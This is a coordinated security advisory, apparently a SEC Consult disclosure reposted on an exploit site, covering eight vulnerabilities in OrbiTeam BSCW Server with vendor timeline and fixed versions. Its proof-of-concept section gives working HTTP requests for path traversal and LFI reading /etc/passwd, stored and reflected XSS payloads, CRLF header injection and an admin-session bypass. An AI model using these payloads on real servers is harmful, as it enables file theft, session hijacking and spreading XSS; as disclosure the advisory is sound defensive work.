@@ -1,0 +1,543 @@
+id: 37092
+date: 12/04/2021
+title: OrbiTeam BSCW Server XSS / LFI / User Enumeration Vulnerabilities
+author: Armin Stock
+cves: 
+
+=======================================================================
+                title: Multiple vulnerabilities in BSCW Server
+              product: OrbiTeam BSCW Server
+   vulnerable version: BSCW Server 5.0.x, 5.1.x, <=5.2.4, <=7.3.x, <=7.4.3
+        fixed version: 5.2.5, 7.4.4
+           CVE number: requested/pending
+               impact: Critical
+             homepage: https://www.bscw.de/
+                found: 2021-09-05
+                   by: Armin Stock (Atos ODS)
+                       SEC Consult Vulnerability Lab
+
+                       An integrated part of SEC Consult, an Atos company
+                       Europe | Asia | North America
+
+                       https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"BSCW Classic is in use around the world. With more than 500 functions, it
+offers the right solution for every task. Turn your ideas into reality! Our
+proven system has been supporting information flow and knowledge management at
+numerous companies for more than 20 years."
+
+Source: OrbiTeam - BSCW Server: https://www.bscw.de/en/
+
+
+Business recommendation:
+------------------------
+The vendor provides a patched version for the affected products which should
+be installed immediately.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Authenticated path traversal allows access to local files
+
+The operation `addtempl` does allow a user to add files from a template
+directory on the server. It accepts the parameter `template`, which is used to
+create the path of the file. The only security mechanism to prevent a path
+traversal attack is `template.replace("../", "")`. This can easily be bypassed,
+by specifying a value like `....//`.
+
+
+2) Authenticated wormable stored XSS
+
+The operation `chbanner` allows a user to change the banner of some objects.
+The banner data does support different text formats.
+
+-------------------------------------------------------------------------------
+# File: bscw/core/bs_txtformat.py
+format_text = 1
+format_textpre = 2
+format_html = 4
+format_bbcode = 8
+format_wiki = 16
+-------------------------------------------------------------------------------
+
+Using the format `textpre - 2` allows the user to include a limited set of HTML
+tags in the banner.
+
+Validation of the provided data is as follows:
+* Use the `Python` module `HTMLParser.HTMLParser` to parse the provided data
+* Override `handle_starttag`
+* check if tag is in `ValidElements`
+* check if an attribute does not start with `on`
+* check that the value of the `href` attribute does not start with `javascript:`
+
+One way to exploit this behavior and perform an XSS attack is to reuse
+the Dojo Toolkit (https://dojotoolkit.org) and the available types.
+
+
+3) Multiple HTTP header attacks
+
+The operation `login` does accept the query parameter `returnto`. The value of
+this parameter is later used as a value in the HTTP response header `Location`.
+As the value is not validated or encoded it is possible to perform several
+attacks:
+
+* Open redirect
+* HTTP header injection
+
+
+4) Session object manipulation allows to bypass entering the password for
+admin actions
+
+The BSCW server has a check to validate that a user is an actual admin, which
+can be summarized as:
+
+Summary of admin check:
+* Is the username in the configured `SERVER_ADMINS` array
+* Is the remote IP in the configured allow-list
+* Has the session object a key `is_admin`
+
+To fulfill the third requirement, the normal way is calling the operation
+`admin` and enter the user password.
+
+An attacker with access to an admin session (maybe via XSS) can bypass this
+step by using any operation based on the `bscw.core.cl_input.InputBase` class.
+This class verifies `POST` requests and the incoming data. If there is something
+wrong, it will save the provided data in the `session` object and redirect the
+user to the current page. The key, which is used to store the provided data in
+the `session` object, is the value of the parameter `session`. This allows an
+attacker to set a non-empty value for the `is_admin` key and fulfill the third
+requirement of the `is_admin` function.
+
+
+5) Unauthenticated LFI
+
+The operation `theme` is vulnerable to a local file inclusion attack. It
+accepts the query parameter `style_name`, which is used to locate a file and
+serve the content. As the parameter is not validated and no restriction is
+enforced to serve only files from specific directories it is possible to read
+arbitrary files.
+
+But there is a restriction, which files can be accesses as the content of the
+file is used as a format string with the `%` operation.
+
+
+6) Unauthenticated reflected XSS - refresh
+
+The operation `refresh` allows setting arbitrary attributes on the `response`
+object. The `response` object is later used to create the actual HTTP response.
+
+Important `response` object attributes:
+* `_type` - e.g. `location` used for redirection, `body` set HTTP body to
+`body` attribute, `file` serve local file
+* `body` - content send as HTTP body, if `_type` == `body`
+* `mimetype` - used for the value of the HTTP header `Content-Type`, can also
+be used for HTTP header injection
+
+
+7) Unauthenticated reflected XSS - upload_browser
+
+The operation `upload_browser` accepts the query parameter `CKEditorFuncNum`,
+which is reflected in the response. As the value is used inside an existing
+`script` block it is possible to inject own `JavaScript` code.
+
+
+8) Unauthenticated user enumeration
+
+It is possible to enumerate all usernames registered on the BSCW server. This
+information can later be used for password-based attacks.
+
+If the verification of the session token fails, a error message is shown to the
+user that he needs to re-authenticate. This message does contain the username
+if the provided `USERID` is valid.
+
+
+Proof of concept:
+-----------------
+1) Authenticated path traversal allows access to local files
+
+This allows an attacker to add any file from the server's filesystem to its own
+folder and download the content afterwards.
+
+-------------------------------------------------------------------------------
+POST /sec/bscw.cgi/209?op=_addtempl HTTP/1.1
+Host: bscw.local:8080
+User-Agent: curl/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 174
+Origin: http://bscw.local:8080
+DNT: 1
+Connection: keep-alive
+Referer: http://bscw.local:8080/sec/bscw.cgi/209?op=addtempl
+Cookie: MicroblogInboxIndicatorState=%5B0%2C0%5D; MicroblogSlidingPanelDisplayState=%22hidden%22; _sec_bscws="3237cc7f0956a03651500ee5e3254a01:51"; 
+bscw_auth="XPN8djYx/kdqb4t8KopuYS+KkgMzTthB:33"
+Upgrade-Insecure-Requests: 1
+
+op=addtempl&bscw_v_post=JoyUiupaaP5QtTJUse%2BD3Vp2IVtkwoTthB&template=....//....//....//....//....//....//....//....//....//....//etc/passwd&name=hello_pwd&description=&_ok_a=+++OK+++
+-------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------
+GET /sec/bscw.cgi/d2748/hello_pwd HTTP/1.1
+....
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Wed, 08 Sep 2021 11:44:10 GMT
+Server: SimpleHTTP/0.6 Python/2.7.18
+Expires: Wed, 08 Sep 2021 09:44:10 GMT
+Last-Modified: Wed, 08 Sep 2021 11:43:52 GMT
+Etag: "2750.1631101432.958828"
+Content-Length: 1049
+Content-Type: application/octet-stream
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+openldap:x:101:102:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
+bscw:x:999:999:BSCW system user:/opt/bscw:/bin/bash
+-------------------------------------------------------------------------------
+
+
+2) Authenticated wormable stored XSS
+
+The following banner code:
+-------------------------------------------------------------------------------
+<P>hello <div data-dojo-type="dojobscw.operations.HoverToolbarButton"
+data-dojo-props="onClick: alert(document.domain)">foo</div>
+-------------------------------------------------------------------------------
+uses only valid tags an attributes. As it contains `Dojo` specific attributes
+it is processed by `Dojo`, which results in executing the provided `JavaScript`
+code. Although the attribute name of the payload is `onClick`, it is triggered
+just by visiting the site.
+
+As it is possible to change the banner of shared objects like folders, a
+malicious user can weaponize a banner, which is shared with other people and
+include a self spreading payload. After other users with access to the folder
+visit it, the payload gets triggered and can copy itself into all other shared
+folders the victim has access to.
+
+
+3) Multiple HTTP header attacks
+
+3.1) Open redirect
+The URL used in the `Location` header can point to any URL, which forces the
+user's browser to navigate to an attacker controlled site.
+
+-------------------------------------------------------------------------------
+GET /pub/bscw.cgi/306?op=login&returnto=https://www.example.com HTTP/1.1
+Host: bscw.local:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: keep-alive
+Cookie: _pub_bscws="88522409e1509f61abbbf230eed829ad:2"
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+-------------------------------------------------------------------------------
+
+Response:
+-------------------------------------------------------------------------------
+HTTP/1.1 303 See Other
+Date: Thu, 02 Sep 2021 20:24:28 GMT
+Server: SimpleHTTP/0.6 Python/2.7.18
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: Thu, 02 Sep 2021 18:24:28 GMT
+Location: https://www.example.com
+Content-Type: text/html; charset=UTF-8
+-------------------------------------------------------------------------------
+
+3.2) Header injection
+As there is no validation at all, it is also possible to inject `\r\n` which
+allows an attacker to "create" new HTTP headers in the response. This can for
+example be abused to set new cookies.
+
+-------------------------------------------------------------------------------
+GET /pub/bscw.cgi/306?op=login&returnto=/%0d%0aSet-Cookie:%20Foo=bar
+...
+-------------------------------------------------------------------------------
+
+Response:
+-------------------------------------------------------------------------------
+HTTP/1.1 303 See Other
+Date: Thu, 02 Sep 2021 20:29:17 GMT
+Server: SimpleHTTP/0.6 Python/2.7.18
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: Thu, 02 Sep 2021 18:29:17 GMT
+Location: http://bscw.local:8080/
+Content-Type: text/html; charset=UTF-8
+Content-Length: 2425
+Set-Cookie: _pub_bscws="6a0d3c1b6810d47d4f57662f9993fceb:2"; expires=Tue, 23 Feb 2027 20:29:17 GMT; httponly; Path=/pub/; Version=1
+Set-Cookie: Foo=bar
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+-------------------------------------------------------------------------------
+
+
+4) Session object manipulation allows to bypass entering the password for
+admin actions
+
+After logging in with an admin account the `Admin` menu is disabled.
+
+Set the `is_admin` attribute in the user session:
+
+-------------------------------------------------------------------------------
+POST /sec/bscw.cgi/30 HTTP/1.1
+Host: bscw.local:8080
+User-Agent: curl/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: keep-alive
+Referer: http://bscw.local:8080/pub/bscw.cgi/30
+Cookie: MicroblogSlidingPanelDisplayState=%22hidden%22; MicroblogInboxIndicatorState=%5B0%2C0%5D; bscw_auth="8Uf4+dFG/DGjTdFBFFFVZORIEMH1TthB:33"; 
+_sec_bscws="fa275d74b9ddb381ea238fb9e62578dd:51"
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+
+op=copylink&id=30&noflash=1&session=is_admin&_ok_.x=+++OK+++
+-------------------------------------------------------------------------------
+
+After issuing the above request the `Admin` menu is enabled, without entering
+the user password.
+
+
+5) Unauthenticated LFI
+
+Getting the `/etc/passwd` file via the public interface:
+
+-------------------------------------------------------------------------------
+GET /pub/bscw.cgi/30?op=theme&style_name=../../../../../../../../etc/passwd HTTP/1.1
+Host: bscw.local:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: keep-alive
+Cookie: MicroblogInboxIndicatorState=%5B1630932508%2C0%5D; MicroblogSlidingPanelDisplayState=%22hidden%22; 
+_sec_bscws="ce8ee39692303f447b50560277dd49f9:51"; bscw_auth="Gpx4/TavfN/lApZ7kyIwEH+Fy4aDTdhB:33"; _pub_bscws="6137c54f:0"
+Upgrade-Insecure-Requests: 1
+
+-------------------------------------------------------------------------------
+
+Response:
+-------------------------------------------------------------------------------
+HTTP/1.1 200 CSS
+Date: Tue, 07 Sep 2021 20:02:35 GMT
+Server: SimpleHTTP/0.6 Python/2.7.18
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: Tue, 07 Sep 2021 18:02:35 GMT
+Content-Type: text/css
+Vary: Accept-Encoding
+Content-Length: 1049
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+openldap:x:101:102:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
+bscw:x:999:999:BSCW system user:/opt/bscw:/bin/bash
+-------------------------------------------------------------------------------
+
+6) Unauthenticated reflected XSS - refresh
+
+Getting an alert box:
+
+-------------------------------------------------------------------------------
+GET 
+/pub/bscw.cgi/30?op=refresh¬ify=1¬ify_args=_type¬ify_args=body¬ify_args=mimetype¬ify_args=encoding&encoding=utf-8%0d%0afoo:%20bar&mimetype=text/html&_type=body&body=<@urlencode><script>alert(document.domain)</script><@/urlencode> 
+HTTP/1.1
+
+
+Response:
+
+HTTP/1.1 200 bscw_dialog
+Date: Fri, 10 Sep 2021 21:16:35 GMT
+Server: SimpleHTTP/0.6 Python/2.7.18
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: Fri, 10 Sep 2021 19:16:35 GMT
+Content-Type: text/html
+Content-Length: 39
+Set-Cookie: _pub_bscws="327c299e8c460787f98700155696c946:2"; expires=Wed, 03 Mar 2027 21:16:35 GMT; httponly; Path=/pub/; Version=1
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+
+<script>alert(document.domain)</script>
+-------------------------------------------------------------------------------
+
+7) Unauthenticated reflected XSS - upload_browser
+
+The value gets written to the following block:
+
+-------------------------------------------------------------------------------
+<script type="text/javascript">
+//<![CDATA[
+
+function CloseWindow(){
+window.close();
+}
+function SetUrl(url){
+window.opener.CKEDITOR.tools.callFunction(INJECT_ME, '.');
+// ^^^ Clear protocol field
+window.opener.CKEDITOR.tools.callFunction(INJECT_ME, url);
+}
+// ....
+
+//]]>
+</script>
+-------------------------------------------------------------------------------
+To escape the function call and keep the `JavaScript` code valid, which is
+required to get executed, the following payload can be used:
+
+`foo)};alert(document.domain);function%20a(){m(a`
+
+The resulting code looks like this:
+
+-------------------------------------------------------------------------------
+<script type="text/javascript">
+//<![CDATA[
+
+function CloseWindow(){
+window.close();
+}
+function SetUrl(url){
+window.opener.CKEDITOR.tools.callFunction(foo)};alert(document.domain);function a(){m(a, '.');
+// ^^^ Clear protocol field
+window.opener.CKEDITOR.tools.callFunction(foo)};alert(document.domain);function a(){m(a, url);
+}
+//..
+//]]>
+</script>
+-------------------------------------------------------------------------------
+
+
+8) Unauthenticated user enumeration
+
+If the verification of the token fails, an error message is shown to the user
+that he needs to re-authenticate. This message does contain the username if the
+provided `USERID` is valid.
+
+-------------------------------------------------------------------------------
+GET /sec/bscw.cgi/2 HTTP/1.1
+Host: bscw.local:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: keep-alive
+Cookie: _sec_bscws="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:264"
+Upgrade-Insecure-Requests: 1
+
+-------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------
+<p class="hint">
+Authenticate yourself for BSCW Shared Workspace Server (sec) at bscw.local.
+<br />
+<a href="/pub/bscw.cgi?op=chpwd">Forgot your password?</a>
+</p>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<th scope="row">
+<label for="uname">User name:</label>
+</th>
+<td>
+<span class="strong">foo</span>
+<input type="hidden" name="username" value="foo" />
+
+</td>
+</tr>
+<tr>
+<th scope="row">
+<label for="pwd">Password:</label>
+</th>
+<td>
+<input class="inputfield" id="pwd" size="40" type="password" name="passwd" value="" />
+</td>
+</tr>
+-------------------------------------------------------------------------------
+
+
+Vulnerable / tested versions:
+-----------------------------
+BSCW Classic 5.2.4 was used to find the vulnerability.
+The vendor confirmed that following versions also affected by the vulnerability:
+
+BSCW Server 5.0.11, 5.1.9, 5.2.4, 7.3.2, <=7.4.3
+
+
+Vendor contact timeline:
+------------------------
+2021-09-11: Sent report to vendor
+2021-09-12: Vendor confirmed the issue and is working on a patch
+2021-11-13: Vendor notified licensed customer about the issue and a patch
+2021-11-25: Requesting CVE numbers (Mitre)
+2021-11-26: Got email confirmation from Mitre, but no CVE numbers yet
+2021-11-29: Scheduled advisory release for 2021-12-01, coordinated with vendor
+2021-12-01: Postponing release because of missing CVE numbers (asked again)
+2021-12-02: Release of security advisory without CVE numbers.
+
+
+Solution:
+---------
+The vendor provides a patched version v5.2.5 and v7.4.4 for the affected and
+supported products which should be installed immediately.
+
+https://www.bscw.de/social/#download
+https://www.bscw.de/classic/#download
+
+#  0day.today [2023-03-26]  #
